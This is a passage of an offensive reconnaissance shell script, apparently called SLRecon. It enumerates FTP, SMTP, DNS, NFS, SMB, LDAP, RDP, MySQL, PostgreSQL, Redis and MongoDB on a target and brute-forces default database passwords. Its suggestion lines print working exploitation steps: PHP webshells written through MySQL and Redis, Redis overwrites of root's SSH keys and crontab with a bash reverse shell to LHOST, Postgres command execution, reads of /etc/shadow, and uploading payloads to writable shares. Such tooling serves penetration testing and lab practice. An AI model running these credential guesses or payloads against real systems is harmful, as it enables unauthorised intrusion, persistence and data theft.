    konsole --title "SLRecon wordlists: $TARGET" -e sh -c "$_wlc_code" sh \
      "$_wlc_script" "$TARGET" "$_WLC_LOG" "$_WLC_RECS" "$_WLC_STATUS" \
      "$_WLC_DONE" "$_WLC_STARTED" "$_wlc_ports" >/dev/null 2>&1 &
    _wlc_launcher=$!
  elif _has x-terminal-emulator; then
    x-terminal-emulator -T "SLRecon wordlists: $TARGET" -e sh -c "$_wlc_code" sh \
      "$_wlc_script" "$TARGET" "$_WLC_LOG" "$_WLC_RECS" "$_WLC_STATUS" \
      "$_WLC_DONE" "$_WLC_STARTED" "$_wlc_ports" >/dev/null 2>&1 &
    _wlc_launcher=$!
  elif _has xterm; then
    xterm -T "SLRecon wordlists: $TARGET" -e sh -c "$_wlc_code" sh \
      "$_wlc_script" "$TARGET" "$_WLC_LOG" "$_WLC_RECS" "$_WLC_STATUS" \
      "$_WLC_DONE" "$_WLC_STARTED" "$_wlc_ports" >/dev/null 2>&1 &
    _wlc_launcher=$!
  fi

  _wlc_wait=0
  while [ ! -f "$_WLC_STARTED" ] && [ "$_wlc_wait" -lt 5 ]; do
    sleep 1
    _wlc_wait=$((_wlc_wait + 1))
  done

  if [ ! -f "$_WLC_STARTED" ]; then
    [ -n "$_wlc_launcher" ] && kill "$_wlc_launcher" 2>/dev/null || true
    warn "Separate terminal unavailable — wordlist worker will run in a background shell"
    sh -c "$_wlc_code" sh "$_wlc_script" "$TARGET" "$_WLC_LOG" "$_WLC_RECS" \
      "$_WLC_STATUS" "$_WLC_DONE" "$_WLC_STARTED" "$_wlc_ports" >/dev/null 2>&1 &
    _wlc_wait=0
    while [ ! -f "$_WLC_STARTED" ] && [ "$_wlc_wait" -lt 3 ]; do
      sleep 1
      _wlc_wait=$((_wlc_wait + 1))
    done
  fi

  if [ ! -f "$_WLC_STARTED" ]; then
    warn "Wordlist companion failed to start — wordlist scans remain in the main shell"
    _rec "[WARN] Separate wordlist worker failed to start"
    rm -f "$_WLC_LOG" "$_WLC_RECS" "$_WLC_STATUS" "$_WLC_DONE" "$_WLC_STARTED"
    rmdir "$WORDLIST_COMPANION_DIR" 2>/dev/null || true
    WORDLIST_COMPANION_DIR=""
    return 1
  fi

  WORDLIST_COMPANION=1
  info "Wordlist scan started in a separate shell (${_wlc_ports:-HTTP auto-detection})"
  info "In that shell, press ENTER to stop all wordlist scans and continue"
  return 0
}

_finish_wordlist_companion() {
  [ "$WORDLIST_COMPANION" -eq 1 ] || return 0

  _wlc_elapsed=0
  while [ ! -f "$_WLC_DONE" ]; do
    sleep 1
    _wlc_elapsed=$((_wlc_elapsed + 1))
    if [ $((_wlc_elapsed % 10)) -eq 0 ]; then
      info "Waiting for separate wordlist scan (${_wlc_elapsed}s elapsed)..."
    fi
  done

  _wlc_status=$(cat "$_WLC_STATUS" 2>/dev/null || echo 1)
  case "$_wlc_status" in ''|*[!0-9]*) _wlc_status=1 ;; esac
  [ -s "$_WLC_RECS" ] && cat "$_WLC_RECS" >> "$_RECS_FILE"

  if [ -n "$OUTDIR" ] && [ -f "$_WLC_LOG" ]; then
    cp "$_WLC_LOG" "$OUTDIR/wordlist_scan.txt"
    {
      printf "\n═══════════════════════════════════════════════\n"
      printf "  SEPARATE WORDLIST SCAN OUTPUT\n"
      printf "═══════════════════════════════════════════════\n\n"
      _strip_colors < "$_WLC_LOG"
    } >> "$OUTDIR/report.txt"
    info "Separate wordlist output attached: $OUTDIR/wordlist_scan.txt"
  fi

  if [ "$_wlc_status" -eq 0 ]; then
    info "Separate wordlist scan completed and merged into the final result"
  else
    warn "Separate wordlist scan ended with status $_wlc_status; partial output was attached"
    _rec "[WARN] Separate wordlist scan incomplete (exit $_wlc_status)"
  fi

  rm -f "$_WLC_LOG" "$_WLC_RECS" "$_WLC_STATUS" "$_WLC_DONE" "$_WLC_STARTED"
  rmdir "$WORDLIST_COMPANION_DIR" 2>/dev/null || true
  WORDLIST_COMPANION=0
}

# ══════════════════════════════════════════════════════════════
#              PHASE 3 — SERVICE ENUMERATION
# ══════════════════════════════════════════════════════════════
phase_services() {
  phase_hdr "SERVICE ENUMERATION"

  # Read open ports
  _ports="${OPEN_PORTS:-}"
  _udp_ports="${OPEN_UDP_PORTS:-}"
  _udp_known=0
  if [ -z "$_ports" ] && [ -n "$OUTDIR" ] && [ -f "$OUTDIR/open_ports.txt" ]; then
    _ports=$(cat "$OUTDIR/open_ports.txt")
  elif [ -z "$_ports" ] && [ -n "$SERVICES_FILE" ] && [ -f "$SERVICES_FILE" ]; then
    _ports=$(grep -oE '^[0-9]+/tcp' "$SERVICES_FILE" | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
  elif [ -z "$_ports" ] && [ -n "$OUTDIR" ] && [ -f "$OUTDIR/nmap_services.txt" ]; then
    _ports=$(grep -oE '^[0-9]+/tcp' "$OUTDIR/nmap_services.txt" | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
  fi
  if [ -n "${OPEN_UDP_PORTS+x}" ] && [ -n "$UDP_SERVICES_FILE" ]; then
    _udp_known=1
  fi
  if [ -z "$_udp_ports" ] && [ -n "$OUTDIR" ] && [ -f "$OUTDIR/open_udp_ports.txt" ]; then
    _udp_ports=$(cat "$OUTDIR/open_udp_ports.txt")
    _udp_known=1
  elif [ -z "$_udp_ports" ] && [ -n "$UDP_SERVICES_FILE" ] && [ -f "$UDP_SERVICES_FILE" ]; then
    _udp_ports=$(grep -oE '^[0-9]+/udp[[:space:]]+open' "$UDP_SERVICES_FILE" | \
      cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
    _udp_known=1
  elif [ -z "$_udp_ports" ] && [ -n "$OUTDIR" ] && [ -f "$OUTDIR/nmap_udp.txt" ]; then
    _udp_ports=$(grep -oE '^[0-9]+/udp[[:space:]]+open' "$OUTDIR/nmap_udp.txt" | \
      cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
    _udp_known=1
  fi

  if [ -z "$_ports" ] && [ "$_udp_known" -eq 0 ]; then
    warn "No TCP/UDP port data — run ports phase first or provide scan results"
    return
  fi

  _has_port() { echo ",$_ports," | grep -q ",$1,"; }
  _has_udp_port() { echo ",$_udp_ports," | grep -q ",$1,"; }

  # ── FTP ──
  if _has_port 21; then
    section "FTP (21)"
    info "Testing anonymous login..."
    _ftp_out=$(curl -sS -m 10 "ftp://$TARGET/" --user "anonymous:anonymous" 2>&1)
    _ftp_status=$?
    if [ "$_ftp_status" -eq 0 ]; then
      hi "FTP anonymous login SUCCESSFUL"
      [ -n "$_ftp_out" ] && emit "$_ftp_out"
      [ -n "$OUTDIR" ] && echo "$_ftp_out" > "$OUTDIR/ftp_listing.txt"
      _rec "[PRIVESC] FTP anonymous login works — enumerate and download:"
      _rec "  → ftp $TARGET  (user: anonymous, pass: anonymous)"
      _rec "  → wget -m --no-passive ftp://anonymous:anonymous@$TARGET/"
      if echo "$_ftp_out" | grep -qiE '\.txt|\.conf|\.bak|\.xml|\.cfg|\.ini|\.sh|\.py|\.key|\.pem|id_rsa'; then
        _rec "  → Sensitive files detected in FTP listing — download immediately"
      fi
    elif [ "$_ftp_status" -eq 67 ]; then
      info "Anonymous login failed"
    else
      warn "FTP anonymous probe failed (exit $_ftp_status)"
      [ -n "$_ftp_out" ] && emit "$_ftp_out"
      _rec "[WARN] FTP anonymous probe failed (exit $_ftp_status)"
    fi
  fi

  # ── SSH ──
  if _has_port 22; then
    section "SSH (22)"
    if _has ssh-audit; then
      info "Running ssh-audit..."
      _ssh_audit=$(timeout -k 5s 60s ssh-audit "$TARGET" 2>&1)
      _ssh_audit_status=$?
      [ -n "$_ssh_audit" ] && emit "$_ssh_audit"
      [ -n "$OUTDIR" ] && printf "%s\n" "$_ssh_audit" > "$OUTDIR/ssh_audit.txt"
      if [ "$_ssh_audit_status" -eq 124 ] || [ "$_ssh_audit_status" -eq 137 ]; then
        warn "ssh-audit timed out"
        _rec "[WARN] ssh-audit timed out"
      elif [ "$_ssh_audit_status" -ne 0 ]; then
        warn "ssh-audit failed (exit $_ssh_audit_status)"
        _rec "[WARN] ssh-audit failed (exit $_ssh_audit_status)"
      fi
      echo "$_ssh_audit" | grep -iE 'vulner|weak|fail|WARN|CVE' | while IFS= read -r line; do
        [ -n "$line" ] && _rec "[ENUM] SSH audit finding: $line"
      done
    else
      warn "ssh-audit not installed — SSH hardening audit skipped"
      _rec "[WARN] SSH audit skipped (ssh-audit missing)"
    fi
  fi

  # ── SMTP ──
  if _has_port 25; then
    section "SMTP (25)"
    info "Testing SMTP commands..."
    _smtp=$(echo "VRFY root" | nc -w 3 "$TARGET" 25 2>/dev/null) || true
    if echo "$_smtp" | grep -q "252\|250"; then
      hi "SMTP VRFY enabled — user enumeration possible"
      [ -n "$OUTDIR" ] && echo "$_smtp" > "$OUTDIR/smtp_vrfy.txt"
      _rec "[ENUM] SMTP VRFY enabled on :25 → enumerate users:"
      _rec "  → smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $TARGET"
      _rec "  → smtp-user-enum -M RCPT -U users.txt -t $TARGET"
      _rec "  → nmap --script smtp-enum-users -p 25 $TARGET"
      _smtp_wl="/usr/share/seclists/Usernames/Names/names.txt"
      if _has smtp-user-enum && [ -f "$_smtp_wl" ]; then
        info "Following up SMTP VRFY with user enumeration (max 60s)..."
        _smtp_enum=$(timeout -k 5s 60s smtp-user-enum -M VRFY -U "$_smtp_wl" -t "$TARGET" 2>&1)
        _smtp_enum_status=$?
        if [ "$_smtp_enum_status" -eq 0 ]; then
          [ -n "$_smtp_enum" ] && emit "$_smtp_enum"
          [ -n "$OUTDIR" ] && printf "%s\n" "$_smtp_enum" > "$OUTDIR/smtp_users.txt"
        elif [ "$_smtp_enum_status" -eq 124 ] || [ "$_smtp_enum_status" -eq 137 ]; then
          warn "SMTP user enumeration timed out"
          _rec "[WARN] SMTP user enumeration timed out"
        else
          warn "SMTP user enumeration failed (exit $_smtp_enum_status)"
          [ -n "$_smtp_enum" ] && emit "$_smtp_enum"
        fi
      else
        warn "SMTP follow-up skipped — smtp-user-enum or username wordlist missing"
        _rec "[WARN] SMTP follow-up incomplete (missing tool/wordlist)"
      fi
    fi
  fi

  # ── DNS ──
  if _has_port 53 || _has_udp_port 53; then
    section "DNS (53)"
    if _has dig; then
      info "Attempting zone transfer..."
      _zt=$(timeout -k 2s 15s dig @"$TARGET" axfr "$TARGET" 2>&1)
      _zt_status=$?
      if echo "$_zt" | grep -q "XFR size"; then
        hi "Zone transfer SUCCESSFUL"
        emit "$_zt"
        [ -n "$OUTDIR" ] && echo "$_zt" > "$OUTDIR/dns_zonetransfer.txt"
        _rec "[PRIVESC] DNS zone transfer allowed — full domain map obtained"
        _rec "  → Review $OUTDIR/dns_zonetransfer.txt for internal hostnames"
        _rec "  → dig @$TARGET axfr <domain>"
        _rec "  → Add discovered hostnames to /etc/hosts for further enum"
      elif [ "$_zt_status" -eq 0 ]; then
        info "Zone transfer denied"
      elif [ "$_zt_status" -eq 124 ] || [ "$_zt_status" -eq 137 ]; then
        warn "DNS zone transfer check timed out"
        _rec "[WARN] DNS zone transfer check timed out"
      else
        warn "DNS zone transfer check failed (exit $_zt_status)"
        [ -n "$_zt" ] && emit "$_zt"
        _rec "[WARN] DNS zone transfer check failed (exit $_zt_status)"
      fi
    else
      warn "dig not installed — DNS zone transfer check skipped"
      _rec "[WARN] DNS zone transfer check skipped (dig missing)"
    fi
    if _has dnsenum; then
      info "Running dnsenum..."
      _dnsenum_out=$(timeout -k 5s 60s dnsenum --dnsserver "$TARGET" "$TARGET" --noreverse 2>&1)
      _dnsenum_status=$?
      if [ -n "$_dnsenum_out" ]; then
        echo "$_dnsenum_out" | head -50 | while IFS= read -r line; do emit "$line"; done
        [ -n "$OUTDIR" ] && echo "$_dnsenum_out" > "$OUTDIR/dnsenum.txt"
      fi
      if [ "$_dnsenum_status" -eq 124 ] || [ "$_dnsenum_status" -eq 137 ]; then
        warn "dnsenum timed out"
        _rec "[WARN] dnsenum timed out"
      elif [ "$_dnsenum_status" -ne 0 ]; then
        warn "dnsenum failed (exit $_dnsenum_status)"
        _rec "[WARN] dnsenum failed (exit $_dnsenum_status)"
      fi
    else
      warn "dnsenum not installed — DNS name enumeration skipped"
      _rec "[WARN] DNS name enumeration skipped (dnsenum missing)"
    fi
  fi

  # ── NFS ──
  if _has_port 2049 || _has_port 111; then
    section "NFS (2049)"
    if _has showmount; then
      info "Checking NFS exports..."
      _nfs=$(timeout -k 2s 15s showmount -e "$TARGET" 2>&1)
      _nfs_status=$?
      if [ "$_nfs_status" -eq 0 ]; then
        emit "$_nfs"
        [ -n "$OUTDIR" ] && echo "$_nfs" > "$OUTDIR/nfs_exports.txt"
        echo "$_nfs" | grep -v '^Export' | while IFS= read -r _export_line; do
          _export_path=$(echo "$_export_line" | awk '{print $1}')
          _export_who=$(echo "$_export_line" | awk '{print $2}')
          [ -z "$_export_path" ] && continue
          _rec "[PRIVESC] NFS export: $_export_path ($_export_who) — mount and inspect:"
          _rec "  → mkdir -p /mnt/nfs_${TARGET}"
          _rec "  → mount -t nfs $TARGET:$_export_path /mnt/nfs_${TARGET}"
          _rec "  → ls -la /mnt/nfs_${TARGET}"
          if echo "$_export_who" | grep -q '\*'; then
            _rec "  → Export open to * — check no_root_squash: create SUID binary if writable"
          fi
        done
      else
        warn "NFS export enumeration failed (exit $_nfs_status)"
        [ -n "$_nfs" ] && emit "$_nfs"
        _rec "[WARN] NFS export enumeration failed (exit $_nfs_status)"
      fi
    else
      warn "showmount not available — try: showmount -e $TARGET"
      _rec "[WARN] NFS export enumeration skipped (showmount missing)"
    fi
  fi

  # ── SMB ──
  if _has_port 445 || _has_port 139; then
    section "SMB (445)"
    if _has enum4linux-ng; then
      info "Running enum4linux-ng..."
      _run_logged "enum4linux-ng" "${OUTDIR:+$OUTDIR/enum4linux.txt}" \
        timeout -k 5s 120s enum4linux-ng -A "$TARGET"
    elif _has enum4linux; then
      info "Running enum4linux..."
      _run_logged "enum4linux" "${OUTDIR:+$OUTDIR/enum4linux.txt}" \
        timeout -k 5s 120s enum4linux -a "$TARGET"
    else
      warn "enum4linux-ng/enum4linux missing — broad SMB enumeration skipped"
      _rec "[WARN] Broad SMB enumeration skipped (enum4linux missing)"
    fi

    if _has smbmap; then
      info "smbmap null session..."
      _smbmap_out=$(timeout -k 2s 30s smbmap -H "$TARGET" -u '' -p '' 2>&1)
      _smbmap_status=$?
      if [ "$_smbmap_status" -eq 0 ] && [ -n "$_smbmap_out" ]; then
        echo "$_smbmap_out" | while IFS= read -r line; do
          emit "$line"
        done
        [ -n "$OUTDIR" ] && echo "$_smbmap_out" > "$OUTDIR/smbmap.txt"
        echo "$_smbmap_out" | grep -iE 'READ|WRITE' | while IFS= read -r line; do
          _share_name=$(echo "$line" | awk '{print $1}')
          _share_perm=$(echo "$line" | grep -oiE 'READ|WRITE' | tr '\n' '+' | sed 's/+$//')
          [ -z "$_share_name" ] && continue
          _rec "[ENUM] SMB share \\\"$_share_name\\\" — $_share_perm access:"
          _rec "  → smbclient //$TARGET/$_share_name -N"
          _rec "  → smbmap -H $TARGET -u '' -p '' -r $_share_name"
          if echo "$_share_perm" | grep -qi 'WRITE'; then
            _rec "  → WRITABLE! Upload payload: smbclient //$TARGET/$_share_name -N -c 'put payload.exe'"
          fi
          _rec "  → Download all: smbget -R smb://$TARGET/$_share_name/ -U ''"
        done
      elif [ "$_smbmap_status" -eq 124 ] || [ "$_smbmap_status" -eq 137 ]; then
        warn "smbmap null-session check timed out"
        _rec "[WARN] smbmap null-session check timed out"
      else
        info "smbmap null session unavailable (exit $_smbmap_status)"
        [ -n "$_smbmap_out" ] && emit "$_smbmap_out"
      fi
    else
      warn "smbmap not installed — SMB permission mapping skipped"
      _rec "[WARN] SMB permission mapping skipped (smbmap missing)"
    fi

    if _has smbclient; then
      info "smbclient share listing..."
      _smb_list=$(timeout -k 2s 30s smbclient -L "//$TARGET" -N 2>&1)
      _smb_list_status=$?
      if [ "$_smb_list_status" -eq 0 ] && [ -n "$_smb_list" ]; then
        echo "$_smb_list" | while IFS= read -r line; do
          emit "$line"
        done
        [ -n "$OUTDIR" ] && echo "$_smb_list" > "$OUTDIR/smbclient_shares.txt"
        echo "$_smb_list" | grep -i 'Disk' | while IFS= read -r line; do
          _share_name=$(echo "$line" | sed 's/^[[:space:]]*//' | awk '{print $1}')
          [ -z "$_share_name" ] && continue
          [ "$_share_name" = "IPC\$" ] && continue
          _rec "[ENUM] SMB share found: $_share_name → smbclient //$TARGET/$_share_name -N"
        done
      elif [ "$_smb_list_status" -eq 124 ] || [ "$_smb_list_status" -eq 137 ]; then
        warn "smbclient share listing timed out"
        _rec "[WARN] smbclient share listing timed out"
      else
        info "smbclient null session unavailable (exit $_smb_list_status)"
        [ -n "$_smb_list" ] && emit "$_smb_list"
      fi
    else
      warn "smbclient not installed — SMB share listing skipped"
      _rec "[WARN] SMB share listing skipped (smbclient missing)"
    fi
  fi

  # ── LDAP ──
  if _has_port 389 || _has_port 636; then
    section "LDAP (389)"
    if _has ldapsearch; then
      info "Testing anonymous bind..."
      _ldap=$(timeout -k 2s 20s ldapsearch -x -H "ldap://$TARGET" -b "" -s base "(objectclass=*)" 2>&1)
      _ldap_status=$?
      if [ "$_ldap_status" -eq 0 ] && [ -n "$_ldap" ]; then
        emit "$_ldap"
        [ -n "$OUTDIR" ] && echo "$_ldap" > "$OUTDIR/ldap_base.txt"
        _ldap_base=$(echo "$_ldap" | grep -i 'namingContexts' | head -1 | awk '{print $2}')
        _rec "[ENUM] LDAP anonymous bind works — enumerate:"
        if [ -n "$_ldap_base" ]; then
          _rec "  → ldapsearch -x -H ldap://$TARGET -b '$_ldap_base' '(objectclass=person)'"
          _rec "  → ldapsearch -x -H ldap://$TARGET -b '$_ldap_base' '(objectclass=*)' | grep -i pass"
        else
          _rec "  → ldapsearch -x -H ldap://$TARGET -b 'DC=domain,DC=local' '(objectclass=*)'"
        fi
        _rec "  → ldapdomaindump -u '' -p '' ldap://$TARGET -o $OUTDIR/ldap/"

        if [ -n "$_ldap_base" ]; then
          info "Following up anonymous LDAP bind with person enumeration (max 60s)..."
          _ldap_people=$(timeout -k 5s 60s ldapsearch -x -H "ldap://$TARGET" -b "$_ldap_base" \
            '(objectclass=person)' cn uid sAMAccountName description 2>&1)
          _ldap_people_status=$?
          if [ "$_ldap_people_status" -eq 0 ]; then
            [ -n "$_ldap_people" ] && emit "$_ldap_people"
            [ -n "$OUTDIR" ] && printf "%s\n" "$_ldap_people" > "$OUTDIR/ldap_people.txt"
            if echo "$_ldap_people" | grep -qiE 'pass(word)?|secret|token'; then
              _rec "[PRIVESC] Potential credentials exposed in LDAP person attributes"
            fi
          elif [ "$_ldap_people_status" -eq 124 ] || [ "$_ldap_people_status" -eq 137 ]; then
            warn "LDAP person enumeration timed out"
            _rec "[WARN] LDAP person enumeration timed out"
          else
            warn "LDAP person enumeration failed (exit $_ldap_people_status)"
            [ -n "$_ldap_people" ] && emit "$_ldap_people"
          fi
        fi
      elif [ "$_ldap_status" -eq 124 ] || [ "$_ldap_status" -eq 137 ]; then
        warn "LDAP anonymous-bind check timed out"
        _rec "[WARN] LDAP anonymous-bind check timed out"
      else
        info "LDAP anonymous bind unavailable (exit $_ldap_status)"
        [ -n "$_ldap" ] && emit "$_ldap"
      fi
    else
      warn "ldapsearch not installed — LDAP anonymous enumeration skipped"
      _rec "[WARN] LDAP enumeration skipped (ldapsearch missing)"
    fi
  fi

  # ── RDP ──
  if _has_port 3389; then
    section "RDP (3389)"
    if _has rdp-sec-check; then
      info "Running rdp-sec-check..."
      _rdp_sec=$(timeout -k 2s 30s rdp-sec-check "$TARGET" 2>&1)
      _rdp_sec_status=$?
      if [ -n "$_rdp_sec" ]; then
        echo "$_rdp_sec" | while IFS= read -r line; do emit "$line"; done
        [ -n "$OUTDIR" ] && echo "$_rdp_sec" > "$OUTDIR/rdp_sec_check.txt"
      fi
      if [ "$_rdp_sec_status" -eq 124 ] || [ "$_rdp_sec_status" -eq 137 ]; then
        warn "rdp-sec-check timed out"
        _rec "[WARN] rdp-sec-check timed out"
      elif [ "$_rdp_sec_status" -ne 0 ]; then
        warn "rdp-sec-check failed (exit $_rdp_sec_status)"
        _rec "[WARN] rdp-sec-check failed (exit $_rdp_sec_status)"
      fi
    else
      warn "rdp-sec-check not installed — dedicated RDP security check skipped"
      _rec "[WARN] Dedicated RDP security check skipped (rdp-sec-check missing)"
    fi
    _rdp_raw=$(timeout -k 2s 30s nmap $NMAP_BASE --script rdp-ntlm-info -p 3389 "$TARGET" 2>&1)
    _rdp_nla_status=$?
    _rdp_nla=$(echo "$_rdp_raw" | grep -i 'Target_Name\|Product_Version\|DNS_Domain') || true
    if [ -n "$_rdp_nla" ]; then
      info "RDP NTLM info:"
      emit "$_rdp_nla"
      [ -n "$OUTDIR" ] && echo "$_rdp_nla" > "$OUTDIR/rdp_ntlm.txt"
      _rec "[ENUM] RDP NTLM info leaked — domain/version info obtained:"
      _rec "  → xfreerdp /v:$TARGET /u:'' /p:''  (test null session)"
      _rec "  → crowbar -b rdp -s $TARGET/32 -U users.txt -C passwords.txt  (bruteforce)"
    elif [ "$_rdp_nla_status" -eq 124 ] || [ "$_rdp_nla_status" -eq 137 ]; then
      warn "RDP NTLM enumeration timed out"
      _rec "[WARN] RDP NTLM enumeration timed out"
    elif [ "$_rdp_nla_status" -ne 0 ]; then
      warn "RDP NTLM enumeration failed (exit $_rdp_nla_status)"
      [ -n "$_rdp_raw" ] && emit "$_rdp_raw"
      _rec "[WARN] RDP NTLM enumeration failed (exit $_rdp_nla_status)"
    fi
  fi

  # ── MySQL ──
  if _has_port 3306; then
    section "MySQL (3306)"
    if _has mysql; then
      info "Testing default credentials..."
      _mysql_success=0
      _mysql_abort=0
      for _mu in root mysql admin; do
        for _mp in "" "root" "mysql" "password" "toor"; do
          _mres=$(timeout -k 2s 8s mysql --connect-timeout=5 -h "$TARGET" -u "$_mu" \
            --password="$_mp" -e "SELECT VERSION();" 2>&1)
          _mysql_status=$?
          if [ "$_mysql_status" -eq 0 ]; then
            _mysql_success=1
            hi "MySQL login SUCCESS: $_mu / $_mp"
            emit "$_mres"
            _mysql_dbs=$(timeout -k 2s 15s mysql --connect-timeout=5 -h "$TARGET" -u "$_mu" \
              --password="$_mp" -e "SHOW DATABASES;" 2>&1)
            _mysql_dbs_status=$?
            [ -n "$_mysql_dbs" ] && emit "$_mysql_dbs"
            if [ "$_mysql_dbs_status" -ne 0 ]; then
              warn "MySQL database enumeration failed (exit $_mysql_dbs_status)"
              _rec "[WARN] MySQL login worked but database enumeration failed (exit $_mysql_dbs_status)"
            fi
            [ -n "$OUTDIR" ] && { echo "Credentials: $_mu:$_mp"; echo "$_mres"; echo "$_mysql_dbs"; } > "$OUTDIR/mysql.txt"
            _rec "[PRIVESC] MySQL accessible with $_mu:$_mp — next steps:"
            _rec "  → mysql -h $TARGET -u $_mu -p'$_mp'"
            _rec "  → SHOW DATABASES; USE <db>; SHOW TABLES; SELECT * FROM users;"
            _rec "  → SELECT load_file('/etc/shadow');"
            _rec "  → SELECT '<?php system(\$_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';"
            _rec "  → UDF exploit: searchsploit mysql udf"
            break 2
          elif [ "$_mysql_status" -eq 124 ] || [ "$_mysql_status" -eq 137 ]; then
            warn "MySQL credential probe timed out"
            _rec "[WARN] MySQL credential probe timed out"
            _mysql_abort=1
            break 2
          elif echo "$_mres" | grep -qiE "can't connect|unknown server host|connection refused|timed out"; then
            warn "MySQL connection failed before credential testing completed"
            [ -n "$_mres" ] && emit "$_mres"
            _rec "[WARN] MySQL credential testing incomplete (connection failure)"
            _mysql_abort=1
            break 2
          fi
        done
      done
      [ "$_mysql_success" -eq 0 ] && [ "$_mysql_abort" -eq 0 ] && info "No tested MySQL default credentials accepted"
    else
      warn "mysql client not installed"
      _rec "[WARN] MySQL credential testing skipped (mysql client missing)"
    fi
  fi

  # ── PostgreSQL ──
  if _has_port 5432; then
    section "PostgreSQL (5432)"
    if _has psql; then
      info "Testing default credentials..."
      _pg_success=0
      _pg_abort=0
      for _pu in postgres admin; do
        for _pp in "" "postgres" "password" "admin"; do
          _pres=$(PGPASSWORD="$_pp" timeout -k 2s 8s psql -w -h "$TARGET" -U "$_pu" \
            -c "SELECT version();" 2>&1)
          _pg_status=$?
          if [ "$_pg_status" -eq 0 ]; then
            _pg_success=1
            hi "PostgreSQL login SUCCESS: $_pu / $_pp"
            emit "$_pres"
            _pg_dbs=$(PGPASSWORD="$_pp" timeout -k 2s 15s psql -w -h "$TARGET" -U "$_pu" -c "\\l" 2>&1)
            _pg_dbs_status=$?
            [ -n "$_pg_dbs" ] && emit "$_pg_dbs"
            if [ "$_pg_dbs_status" -ne 0 ]; then
              warn "PostgreSQL database enumeration failed (exit $_pg_dbs_status)"
              _rec "[WARN] PostgreSQL login worked but database enumeration failed (exit $_pg_dbs_status)"
            fi
            [ -n "$OUTDIR" ] && { echo "Credentials: $_pu:$_pp"; echo "$_pres"; echo "$_pg_dbs"; } > "$OUTDIR/postgresql.txt"
            _rec "[PRIVESC] PostgreSQL accessible with $_pu:$_pp — next steps:"
            _rec "  → PGPASSWORD='$_pp' psql -h $TARGET -U $_pu"
            _rec "  → \\l (list databases), \\dt (list tables), SELECT * FROM users;"
            _rec "  → COPY (SELECT '') TO PROGRAM 'id';  (RCE as postgres user)"
            _rec "  → SELECT pg_read_file('/etc/passwd');"
            break 2
          elif [ "$_pg_status" -eq 124 ] || [ "$_pg_status" -eq 137 ]; then
            warn "PostgreSQL credential probe timed out"
            _rec "[WARN] PostgreSQL credential probe timed out"
            _pg_abort=1
            break 2
          elif echo "$_pres" | grep -qiE 'could not connect|connection refused|timeout expired|could not translate host'; then
            warn "PostgreSQL connection failed before credential testing completed"
            [ -n "$_pres" ] && emit "$_pres"
            _rec "[WARN] PostgreSQL credential testing incomplete (connection failure)"
            _pg_abort=1
            break 2
          fi
        done
      done
      [ "$_pg_success" -eq 0 ] && [ "$_pg_abort" -eq 0 ] && info "No tested PostgreSQL default credentials accepted"
    else
      warn "psql client not installed"
      _rec "[WARN] PostgreSQL credential testing skipped (psql missing)"
    fi
  fi

  # ── Redis ──
  if _has_port 6379; then
    section "Redis (6379)"
    _redis=$(printf "INFO server\r\nQUIT\r\n" | timeout -k 2s 8s nc -w 5 "$TARGET" 6379 2>&1)
    _redis_status=$?
    if echo "$_redis" | grep -q "redis_version"; then
      hi "Redis NO AUTH — accessible without password"
      _redis_ver=$(echo "$_redis" | grep "redis_version:" | cut -d: -f2 | tr -d '\r')
      info "Redis version: $_redis_ver"
      [ -n "$OUTDIR" ] && echo "$_redis" > "$OUTDIR/redis_info.txt"
      _redis_keys=$(printf "KEYS *\r\nQUIT\r\n" | timeout -k 2s 8s nc -w 5 "$TARGET" 6379 2>&1)
      _redis_keys_status=$?
      if [ -n "$_redis_keys" ]; then
        emit "$_redis_keys"
        [ -n "$OUTDIR" ] && echo "$_redis_keys" >> "$OUTDIR/redis_info.txt"
      fi
      if [ "$_redis_keys_status" -ne 0 ]; then
        warn "Redis key enumeration failed (exit $_redis_keys_status)"
        _rec "[WARN] Redis no-auth confirmed but key enumeration failed (exit $_redis_keys_status)"
      fi
      _rec "[PRIVESC] Redis no-auth on :6379 (v$_redis_ver) — exploitation paths:"
      _rec "  → redis-cli -h $TARGET"
      _rec "  → KEYS *  →  GET <key>  (dump all data)"
      _rec "  → Webshell: CONFIG SET dir /var/www/html/; CONFIG SET dbfilename shell.php; SET x '<?php system(\$_GET[c]); ?>'; SAVE"
      _rec "  → SSH key: CONFIG SET dir /root/.ssh/; CONFIG SET dbfilename authorized_keys; SET x '<your_pubkey>'; SAVE"
      _rec "  → Crontab: CONFIG SET dir /var/spool/cron/crontabs/; CONFIG SET dbfilename root; SET x '\\n* * * * * bash -i >& /dev/tcp/LHOST/PORT 0>&1\\n'; SAVE"
    elif [ "$_redis_status" -eq 124 ] || [ "$_redis_status" -eq 137 ]; then
      warn "Redis no-auth probe timed out"
      _rec "[WARN] Redis no-auth probe timed out"
    elif [ "$_redis_status" -ne 0 ]; then
      warn "Redis no-auth probe failed (exit $_redis_status)"
      [ -n "$_redis" ] && emit "$_redis"
      _rec "[WARN] Redis no-auth probe failed (exit $_redis_status)"
    else
      info "Redis requires authentication or did not return server info"
    fi
  fi

  # ── MongoDB ──
  if _has_port 27017; then
    section "MongoDB (27017)"
    if _has mongosh; then
      _mongo=$(timeout -k 2s 20s mongosh --host "$TARGET" \
        --eval "db.adminCommand('listDatabases')" --quiet 2>&1)
      _mongo_status=$?
      if [ "$_mongo_status" -eq 0 ] && [ -n "$_mongo" ]; then
        hi "MongoDB NO AUTH — listing databases"
        emit "$_mongo"
        [ -n "$OUTDIR" ] && echo "$_mongo" > "$OUTDIR/mongodb.txt"
        _rec "[PRIVESC] MongoDB no-auth on :27017 — next steps:"
        _rec "  → mongosh --host $TARGET"
        _rec "  → show dbs; use <db>; show collections; db.<collection>.find()"
        _rec "  → Search for creds: db.<collection>.find({}, {password:1, passwd:1, secret:1})"
      elif [ "$_mongo_status" -eq 124 ] || [ "$_mongo_status" -eq 137 ]; then
        warn "MongoDB no-auth probe timed out"
        _rec "[WARN] MongoDB no-auth probe timed out"
      else
        info "MongoDB anonymous access unavailable (exit $_mongo_status)"
        [ -n "$_mongo" ] && emit "$_mongo"
      fi
    else
      warn "mongosh not installed — MongoDB no-auth check skipped"
      _rec "[WARN] MongoDB no-auth check skipped (mongosh missing)"
    fi
  fi

  # ── SNMP ──
  if [ "$_udp_known" -eq 0 ] || _has_udp_port 161; then
  if _has onesixtyone; then
